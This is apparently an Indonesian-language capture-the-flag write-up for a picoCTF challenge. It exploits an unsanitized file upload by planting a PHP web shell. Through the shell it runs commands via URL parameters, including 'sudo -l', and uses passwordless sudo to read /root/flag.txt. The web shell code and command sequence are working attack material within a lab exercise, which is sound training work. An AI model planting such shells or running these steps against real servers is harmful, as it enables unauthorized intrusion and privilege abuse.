# n0s4n1ty 1

Pengembang telah menambahkan fungsionalitas unggahan gambar profil ke situs web. Namun, implementasinya cacat, dan menghadirkan peluang bagi Anda. Misi Anda, jika Anda memilih untuk menerimanya, adalah menavigasi ke halaman web yang disediakan dan menemukan area unggahan file. Tujuan utama Anda adalah menemukan bendera tersembunyi yang terletak di direktori.

### Petunjuk

1. Unggah file tidak disanitasi
2. Setiap kali Anda mendapatkan shell di mesin jarak jauh, periksa

```bash
sudo -l
```

## Documentation

1. Pertama -tama pergi ke instance dan Anda akan melihat kerentanan unggahan file. Jadi, skrip semacam apa pun dapat diunggah

![App Screenshot](/images/5.png)

2. Lalu saya membuat shell php ini dan diunggah ke server:

```bash
  <?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];  // Get command from the query string
    system($cmd);         // Execute the command and display output
    echo "</pre>";
}
?>
```

File utama dapat diakses [disini](/NOSANITY/n0s4n1ty-1.php).

3. Maka perintah apa pun dapat dieksekusi dengan memicu jalur:
   Endpoint: uploads/shell.php?cmd=

```bash
http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=
```

- Mari kita periksa pengguna saat ini:

```bash
http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=whoami
```

- Sekarang mari kita lihat hak istimewa untuk pengguna saat ini:

```bash
http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=sudo -l
```

- Setelah mengeksekusi peerintah diatas, maka akan muncul seperti ini

```bash
Matching Defaults entries for www-data on challenge:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```

```bash
(ALL) NOPASSWD: ALL
```

- Jadi, tidak ada kata sandi yang diperlukan untuk mengakses pengguna dan root mana pun.

- Sekarang mari kita dapatkan flag sebagai pengguna root:

```bash
http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=sudo cat /root/flag.txt
```

- Setelah perintah diatas dijalankan maka kita akan dapat menemukan flag-nya.
